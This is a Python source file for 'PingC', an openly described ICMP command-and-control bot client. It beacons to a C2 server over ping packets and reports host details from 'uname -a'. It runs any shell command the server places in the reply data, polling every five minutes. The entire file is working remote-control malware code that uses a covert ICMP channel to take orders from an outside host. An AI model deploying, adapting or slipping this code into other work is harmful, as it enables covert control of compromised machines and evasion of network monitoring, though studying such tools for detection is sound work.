#! /usr/bin/env python

# PingC ICMP command and control client application
# by NoCow
# This is the client side application for my ICMP C2 project. The client will periodically ping the C2 server
#  and receive commands in the data portion of the reply. I am currently using Scapy for the packet building
# Usage: ./pingc.py <IP>

import sys
import time
import signal
import subprocess as sub
from scapy.all import sr,sr1,ICMP,IP


def getId():
	#print "[D] Getting bot Id"
	conf_file = open('pingc.conf','r')
	id='null'
	for line in conf_file:
		if 'id=' in line:
			id=line[3:]
	#print "[D] Return id: " + id
	return id	

def collectId(botId):
	#print "[D] Writing bot Id: ",botId
	conf_file = open('pingc.conf','w')
	idstr="id="+str(botId)
	conf_file.write(idstr)
	conf_file.close()

def handler(signum, frame):
        print 'Bye!'
        sys.exit()

def sendPingRequest(command):
	packet=IP(dst=sys.argv[1])/ICMP()/str(command)
        packet.show()
        p=sr1(packet,timeout=5)
        #p.show()
	print "[*] String sent to C2 server: " + command
	if p:
		return p
	else:
		return

def processReply(p):
	try:
		response=p['Raw'].load
        except:
		print "[X] Error: ", sys.exc_info()[0]
		return
	# Check ICMP data for 'run' command
        print "[*] String received from C2 server: " + p['Raw'].load
        if 'run' in response:
        	print "[*] Master says run command: " + response[4:]
                command = response[4:]
                command.split()
                proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
		print output
                print errors
	elif 'sysinfo' in response:
        	print "[*] Master requesting sysinfo"
		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
                id=getId()
		sendRequest = 'sysinfo %s %s' % (str(id),output)
		p=sendPingRequest(sendRequest)
		if p:	
			processReply(p)
		#print output
                print errors
	elif 'Thanks' in response:
		print "[*] Thanks received"
		print "[*] Sleeping for 10"
		time.sleep(10)
        elif 'sleep' in response:
		seconds = response[6:]
                print "[*] Master says sleep for %s seconds" % (seconds)
                print "[*] Sleeping..."
                time.sleep(int(seconds))
		id=getId()
		sendStr="What shall I do master? " + str(id)
                p=sendPingRequest(sendStr)
                processReply(p)
	elif 'id=' in response:
		print "[*] Checked in...placing id in conf file"
		collectId(response[3:])

def main(argv):
	id = getId()
	if id=='null':
		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
                p=sendPingRequest('Checkin %s' % output)
                if p:
                        processReply(p)
                #print output
                print errors
		if p:
			processReply(p)
		#print "[D] id==null"
	while True:
		if len(argv) < 1:
			print "----------------------------"
			print "PingC Usage"
			print " ./pingc.py <IP>"
			print "----------------------------"
			exit()
		signal.signal(signal.SIGINT, handler)
		id = getId()
		sendStr="What shall I do master? " + id
		p=sendPingRequest(sendStr)
		if p:
			processReply(p)
		print "[*] Sleeping now..."
		time.sleep(300)

if __name__ == "__main__":
   main(sys.argv[1:])

